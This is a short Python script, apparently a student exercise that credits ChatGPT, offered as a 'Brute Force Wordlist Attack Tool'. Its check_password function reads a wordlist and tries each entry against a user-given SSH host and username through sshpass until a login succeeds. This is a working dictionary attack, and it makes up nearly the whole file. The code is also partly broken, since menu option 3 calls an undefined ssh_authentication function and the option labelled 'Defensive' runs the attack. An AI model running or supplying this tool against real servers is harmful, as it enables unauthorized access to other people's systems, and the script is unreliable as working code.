#!/usr/bin/python3

#Tyler Housden

#utilized chatgpt


import time
import getpass
import subprocess
import logging

# Configure logging
logging.basicConfig(filename='brute_force.log', level=logging.DEBUG,
                    format='%(asctime)s %(levelname)s: %(message)s',
                    datefmt='%Y-%m-%d %H:%M:%S')

# Define functions
def iterator():
    filepath = input("Enter your dictionary filepath: ")
    with open(filepath, encoding="ISO-8859-1") as file:
        for line in file:
            word = line.strip()
            print(word)
            time.sleep(1)

def check_password():
    username = input("Enter the username: ")
    ip_address = input("Enter the IP address: ")
    filepath = input("Enter your dictionary filepath: ")
    with open(filepath, encoding="ISO-8859-1") as file:
        for line in file:
            password = line.strip()
            print(f"Trying password: {password}")
            try:
                try_login = subprocess.run(["sshpass", "-p", password, "ssh", f"{username}@{ip_address}", "-o", "ConnectTimeout=5"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                if try_login.returncode == 0:
                    print("Login successful!")
                    return
            except subprocess.CalledProcessError as e:
                logging.error(f"Error occurred during login attempt: {e}")
    print("Password not found.")

# Main
while True:
    mode = input("""
    Brute Force Wordlist Attack Tool Menu
    1 - Offensive, Dictionary Iterator
    2 - Defensive, Password Recognized
    3 - SSH Authentication
    4 - Exit
    Please enter a number: 
    """)
    if mode == "1":
        iterator()
    elif mode == "2":
        check_password()
    elif mode == "3":
        ssh_authentication()
    elif mode == "4":
        break
    else:
        print("Invalid selection.")
